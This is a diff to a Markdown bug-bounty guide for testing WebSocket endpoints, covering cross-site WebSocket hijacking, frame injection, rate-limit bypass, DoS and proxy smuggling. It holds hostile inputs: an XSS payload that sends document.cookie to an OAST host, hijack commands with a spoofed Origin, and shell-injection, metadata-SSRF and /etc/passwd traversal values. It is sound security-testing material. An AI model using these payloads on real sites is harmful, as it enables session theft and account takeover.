@@ -3,7 +3,7 @@
 **Author:** x8bitranjit
 **Scope:** Web apps & APIs using WebSockets (`ws://`/`wss://`) — chat/messaging, live dashboards, notifications, trading/price feeds, collaborative editors, multiplayer, IoT/telemetry, and framework transports (socket.io, SignalR, STOMP, SockJS, graphql-ws, MQTT-over-WS)
 **Platforms:** Burp Suite (WebSockets history + repeat/edit frames); `websocat`/`wscat`/Python `websockets`; browser DevTools (Network → WS); Kali/Windows
-**Companion files:**
+**Companion files in this folder:**
 - `WEBSOCKET_ARSENAL.md` — handshake/CSWSH PoCs, frame-tamper payloads, websocat/wscat one-liners, framework recipes
 - `WEBSOCKET_CHECKLIST.md` — the per-endpoint testing-order checklist
 - `WEBSOCKET_REPORT_TEMPLATE.md` — the report skeleton (CSWSH cross-origin proof front-and-center)
@@ -113,6 +113,8 @@ websocat -H='Origin: https://evil.example' -H='Cookie: session=<victim>' 'wss://
 wscat -c 'wss://target.com/ws' -H 'Origin: https://evil.example'
 ```
 > **The cardinal rule of WebSocket testing:** *the handshake decides the cross-origin game, the frames decide the injection game.* First read the handshake (cookie-vs-token auth, `Origin` check, `wss`), then treat every message field as untrusted input to the backend.
+
+> **Windows:** Burp + DevTools run natively; `websocat` is a single static binary; run the Python helpers in WSL or native Python (`pip install websockets`). Use two browser profiles for A/B and a separate origin to host the CSWSH PoC.
 
 ---
 
@@ -252,15 +254,10 @@ After the handshake it's just frames — **apply every injection class to every 
 {"type":"chat","room":"general","text":"<img src=x onerror=fetch('//YOUR.oast.fun/'+document.cookie)>"}
 ```
 **8.2 SQLi / NoSQLi.** A message field used in a DB query: `{"search":"' OR '1'='1"}`, `{"id":{"$ne":null}}` (Mongo). Error/UNION/time-based as usual → data dump / auth bypass. (SQLi/NoSQLi kits.)
-
 **8.3 OS command injection / SSRF.** A field reaching a shell or an outbound request (`{"convert":"pdf; id"}`, `{"fetchUrl":"http://169.254.169.254/..."}`) → time-based RCE / SSRF→metadata (interactsh to confirm blind).
-
 **8.4 IDOR / object reference** (see §6.2) — swap ids in frames.
-
 **8.5 Path traversal / LFI** — `{"file":"../../etc/passwd"}` in a "download/preview" message.
-
 **8.6 Type juggling / schema confusion** — send arrays/objects where a scalar is expected, extra fields (mass-assignment over WS: `{"updateProfile":{"role":"admin"}}`), or malformed frames to trip the parser.
-
 **8.7 Deserialization / binary frames** — if messages are binary (protobuf, MessagePack, Java/.NET serialized), decode and tamper; serialized-object messages can be **insecure deserialization → RCE**.
 
 > Treat the WS exactly like a parameterized HTTP endpoint that nobody hardened. **Injection through a message → RCE / SQLi dump / stored-XSS is the top-impact WebSocket outcome** (§17).
@@ -268,41 +265,29 @@ After the handshake it's just frames — **apply every injection class to every 
 # 9. CSWSH → ATO / Data Theft / State Change
 
 Turn the §5 hijack into impact. From the **attacker's** page (running in the victim's browser):
-
 **9.1 Exfiltrate private data.** Open the socket, send the app's "load my conversations / account / orders" message, and **`fetch()` the responses to your server**. CSWSH leaks the victim's live private data because the responses come back to your JS.
-
 **9.2 State change → ATO.** Send a state-changing message **as the victim**: change email/recovery, add a payment method, post/transfer, change settings. Change email → trigger reset → **ATO** (like CSRF, but you can also read the confirmation message).
-
 **9.3 Read the session/token over the socket.** If the app echoes the user's profile/token in a message, the hijack hands you their credentials.
-
 **9.4 Scope it.** State which messages you could send/read and the worst outcome (full inbox theft, ATO, admin action). That's what sets severity (§17).
 
 # 10. Rate-Limit / Brute-Force / Anti-Automation Bypass over WS
 
 **10.1 HTTP limits don't cover WS messages.** A login/OTP/coupon endpoint that's rate-limited over HTTP is frequently **unlimited over the WebSocket** message channel. Send many `{"type":"verifyOtp","code":"0001"}` frames on one socket → brute the code → **ATO**.
-
 **10.2 One socket, many messages.** No per-message throttle = high-rate brute with one connection and one log line. Confirm by counting accepted attempts vs the documented cap.
-
 **10.3 Combine with §6** (no per-message authz) to brute actions against other users.
 
 # 11. Denial of Service
 
 > ⚠️ **Measure, don't flood — and only with explicit permission/scope.**
-
 **11.1 Connection exhaustion.** Open many sockets / never close them → exhaust server connection/memory limits (note missing per-IP/per-user connection caps).
-
 **11.2 Large / fragmented frames.** Send oversized or many-fragment messages → memory/CPU pressure if no max-frame-size.
-
 **11.3 `permessage-deflate` decompression bomb.** If the server negotiates the compression extension, a small highly-compressible payload can **decompress to a huge buffer** server-side (a "zip-bomb" for WS) → memory DoS. Report missing decompressed-size limits.
-
 **11.4 Slow / idle sockets.** Holding many idle/half-open sockets (no ping/pong timeout) ties up resources.
 
 # 12. Smuggling & Reverse-Proxy Misconfig
 
 **12.1 WebSocket upgrade smuggling.** Some reverse proxies mishandle the `Upgrade`/`Connection` headers (esp. HTTP/2→HTTP/1.1 downgrades, h2c) — a crafted upgrade can **smuggle** a request past front-end controls or **tunnel** to internal services. (Cross-ref the Request Smuggling kit.)
-
 **12.2 Proxy auth/Origin stripping.** A gateway meant to enforce auth/Origin on `/ws` may not, while the backend trusts the gateway → direct-to-backend or header-spoofed connects.
-
 **12.3 Internal WS exposed.** Admin/internal WS endpoints (metrics, debug, orchestration) reachable from the internet → unauth control. Hunt them via JS/recon (§3).
 
 # 13. Framework Specifics
@@ -312,7 +297,7 @@ Recognise the transport — the framing and handshake differ, and each has quirk
 - **SignalR (.NET)** — `/negotiate` HTTP endpoint issues a `connectionToken`, then a WS hub at `/hub`. Test the negotiate auth and hub method authorization (BFLA: invoke privileged hub methods).
 - **STOMP over WS** — frames like `SEND`/`SUBSCRIBE` with `destination:` headers → **subscribe to other users'/admin destinations** (authz-broken pub/sub, §6.4); header injection in STOMP frames.
 - **SockJS** — falls back to XHR/EventSource when WS is blocked; test the fallback transports too (and their Origin/CSRF handling).
-- **graphql-ws / subscriptions-transport-ws** — GraphQL subscriptions over WS; `connection_init` + `subscribe` frames → **CSWSH + GraphQL BOLA** (see the GraphQL kit §15.5).
+- **graphql-ws / subscriptions-transport-ws** — GraphQL subscriptions over WS; `connection_init` + `subscribe` frames → **CSWSH + GraphQL BOLA** (see the `API/GraphQL/` kit §15.5).
 - **Rails ActionCable** (`/cable`), **Phoenix Channels**, **MQTT-over-WS** — all carry channel/topic subscriptions → test channel authz.
 
 ---
@@ -461,8 +446,6 @@ Then: severity by what the socket can READ + DO; PoC; report.
 - **CWE-1385** (Missing Origin Validation in WebSockets) https://cwe.mitre.org/data/definitions/1385.html · **CWE-346** /346 · **CWE-352** /352 · **CWE-319** /319 · **CWE-306/862/285** (authn/authz)
 - **RFC 6455** (The WebSocket Protocol); **RFC 7692** (`permessage-deflate`); **graphql-ws** & **subscriptions-transport-ws** sub-protocols
 - **Tools** — Burp (WebSockets history + CSWSH PoC generator), **websocat**, **wscat**, Python **websockets**, **STÖK/ws-harness**
-- **Related kits** — CSRF (the cookie/SameSite gate), CORS (Origin allow-list bypasses), IDOR (two-account proof), XSS (escalate stored-XSS), GraphQL (subscriptions/CSWSH), Request Smuggling (upgrade smuggling).
+- **Related kits here** — CSRF (the cookie/SameSite gate), CORS (Origin allow-list bypasses), IDOR (two-account proof), XSS (escalate stored-XSS), GraphQL (`API/GraphQL/` §15.5 subscriptions/CSWSH), Request Smuggling (upgrade smuggling).
 
 > **Authorized testing only.** CSWSH PoCs exfiltrate to **your** server using **your** victim test account; prove cross-site in a real browser; two own accounts for IDOR; measured counts for brute; measure-don't-flood for DoS; revert state. Report **impact** (data theft, ATO, RCE, XSS, cross-user) — not "no Origin check."
-
-**Contact:** [LinkedIn](https://in.linkedin.com/in/x8bitranjit)
